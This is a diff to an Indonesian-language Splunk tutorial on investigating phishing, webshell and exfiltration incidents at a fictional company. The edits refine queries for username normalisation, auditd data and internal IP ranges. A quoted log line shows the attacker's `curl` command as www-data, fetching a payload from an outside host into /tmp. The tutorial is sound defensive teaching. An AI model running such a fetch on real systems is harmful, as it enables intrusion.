@@ -112,7 +112,8 @@ Bila proxy tidak mencatat user, pakai DNS dan korelasikan lewat `src`:
 
 ```
 index=vpn OR index=o365 earliest=-7d
-    user IN ("andi.pratama","budi.santoso","fitri.handayani")
+    user IN ("andi.pratama*","budi.santoso*","fitri.handayani*")
+| eval user=lower(mvindex(split(user,"@"),0))
 | eval berhasil=if(action="success",1,0)
 | stats count sum(berhasil) AS sukses values(src) AS sumber values(app) AS aplikasi
         dc(src) AS jumlah_sumber min(_time) AS awal max(_time) AS akhir BY user
@@ -128,12 +129,14 @@ andi.pratama  52     3       10.10.4.18 203.0.113.50  webmail,vpn  2            
 budi.santoso  18     18      10.10.4.31               webmail      1              2026-10-08 07:50:02  2026-10-08 17:44:51
 ```
 
+Wildcard di akhir nama dan `eval` sesudahnya ada karena dua index menulis user dengan bentuk berbeda: VPN memakai nama akun pendek, sedangkan log Entra ID di `o365` memakai UPN seperti `andi.pratama@jab.example`. Tanpa penyeragaman itu, satu orang muncul sebagai dua baris dan `jumlah_sumber` terpecah.
+
 Cara membacanya: `andi.pratama` punya login sukses dari IP yang bukan jaringan internal, tak lama setelah klik. Itu indikasi kredensial dipakai pihak lain. `budi.santoso` hanya login dari dalam, jadi ia kemungkinan mengklik tanpa memasukkan kredensial, atau tidak mengklik sama sekali.
 
 **Langkah A4. Apa yang dilakukan setelah login.** Untuk kasus email, dua hal yang paling sering dan paling merusak adalah aturan penerusan email dan pendaftaran metode MFA baru:
 
 ```
-index=o365 earliest=-7d user="andi.pratama"
+index=o365 earliest=-7d user="andi.pratama@jab.example"
     (operation IN ("New-InboxRule","Set-InboxRule","Set-Mailbox","Add-MailboxPermission")
      OR operation="*MFA*" OR operation="*StrongAuthentication*")
 | table _time user operation src parameters
@@ -146,6 +149,7 @@ Nama operasi di atas mengikuti log mailbox dan identitas awan; nama persisnya be
 
 ```
 index=vpn OR index=o365 earliest=-7d src="203.0.113.50"
+| eval user=lower(mvindex(split(user,"@"),0))
 | stats count values(action) AS aksi min(_time) AS awal BY user
 | eval awal=strftime(awal,"%F %T")
 | sort awal
@@ -232,6 +236,8 @@ curl          www-data  1      curl -s http://203.0.113.77:8080/l -o /tmp/l 2026
 
 Ini bukti eksekusi, dan statusnya berubah dari "percobaan" menjadi "berhasil, dengan eksekusi perintah". Keyakinan naik menjadi tinggi.
 
+`jkt-portal01` adalah server Linux, jadi data prosesnya di PT JAB datang dari auditd (`linux_audit` di index `linux`, Day 06), bukan dari index `sysmon` yang hanya berisi host Windows. Query di atas mengasumsikan add-on yang kamu pakai memetakan event auditd ke data model Endpoint. Cek dulu pemetaan itu di instance-mu; bila belum ada, cari langsung di `index=linux sourcetype=linux_audit host=jkt-portal01` dengan field yang dibahas di Day 06.
+
 **Langkah B4. Cari persistence dan pergerakan.**
 
 ```
@@ -246,15 +252,16 @@ Ini bukti eksekusi, dan statusnya berubah dari "percobaan" menjadi "berhasil, de
 
 ```
 | tstats summariesonly=false count from datamodel=Network_Traffic.All_Traffic
-    where All_Traffic.src="10.20.9.40" NOT All_Traffic.dest IN ("10.20.0.0/16")
+    where All_Traffic.src="10.20.9.40"
+      NOT All_Traffic.dest IN ("10.10.0.0/16","10.20.0.0/16","10.30.0.0/16")
       earliest=-24h by All_Traffic.dest All_Traffic.dest_port
 | rename All_Traffic.* AS *
 | sort - count
 ```
 
-Server web yang memulai koneksi keluar ke internet adalah anomali di sebagian besar arsitektur. Bila ada, itu jalur unduhan tool atau C2.
+Ketiga rentang yang dikecualikan adalah seluruh jaringan internal PT JAB (kantor Jakarta, data center, dan Bandung), sehingga yang tersisa hanya tujuan di luar. Server web yang memulai koneksi keluar ke internet adalah anomali di sebagian besar arsitektur. Bila ada, itu jalur unduhan tool atau C2.
 
-**Kesimpulan dan laporan (ilustrasi).** Keyakinan tinggi bahwa unggahan file tanpa validasi di `/app/upload.php` dipakai untuk menanam webshell pada 2026-10-09 10:21, lalu dipakai menjalankan perintah pengintaian dan mengunduh satu berkas. Tidak ada bukti pergerakan ke host lain dalam 24 jam. Keterbatasan: access log `jkt-portal01` hanya tersimpan 7 hari, dan tidak ada EDR di `jkt-portal01` sehingga bukti eksekusi hanya dari Sysmon untuk Linux.
+**Kesimpulan dan laporan (ilustrasi).** Keyakinan tinggi bahwa unggahan file tanpa validasi di `/app/upload.php` dipakai untuk menanam webshell pada 2026-10-09 10:21, lalu dipakai menjalankan perintah pengintaian dan mengunduh satu berkas. Tidak ada bukti pergerakan ke host lain dalam 24 jam. Keterbatasan: access log `jkt-portal01` hanya tersimpan 7 hari, dan tidak ada EDR di `jkt-portal01` sehingga bukti eksekusi hanya dari auditd, dan hanya untuk aktivitas yang punya aturan audit.
 
 **Tindakan:** isolasi server, simpan salinan file webshell beserta hash-nya dan, bila memungkinkan, akuisisi memori server sebelum dimatikan, karena proses yang dijalankan lewat webshell sering hanya terlihat di memori, hapus webshell setelah bukti disimpan, perbaiki validasi unggahan, blokir IP, dan periksa seluruh direktori unggahan untuk file lain.
 
@@ -346,13 +353,15 @@ Event 7045 (service baru), 4697 (service dipasang), dan 4698 (scheduled task dib
 ```
 | tstats summariesonly=false sum(All_Traffic.bytes_out) AS keluar
     from datamodel=Network_Traffic.All_Traffic
-    where All_Traffic.src IN ("10.20.9.0/24") earliest=-2d
+    where All_Traffic.src IN ("10.20.10.21","10.20.10.32") earliest=-2d
     by All_Traffic.src All_Traffic.dest
 | rename All_Traffic.* AS *
 | eval keluar_MB=round(keluar/1024/1024,1)
 | where keluar_MB>200
 | sort - keluar_MB
 ```
+
+Data model Network_Traffic biasanya berisi IP, bukan nama host, jadi IP kedua server (`JKT-FS01` di 10.20.10.21 dan `JKT-DB02` di 10.20.10.32) diambil dulu dari inventaris aset (Day 26). Tujuan internal sengaja tidak dikecualikan, karena pemindahan arsip ke host internal lain sebelum dikirim keluar juga bagian dari jejak yang dicari.
 
 **Langkah C6. Tentukan batas insiden.** Daftar host dan akun yang tersentuh adalah hasil akhir yang paling dibutuhkan tim respons:
 
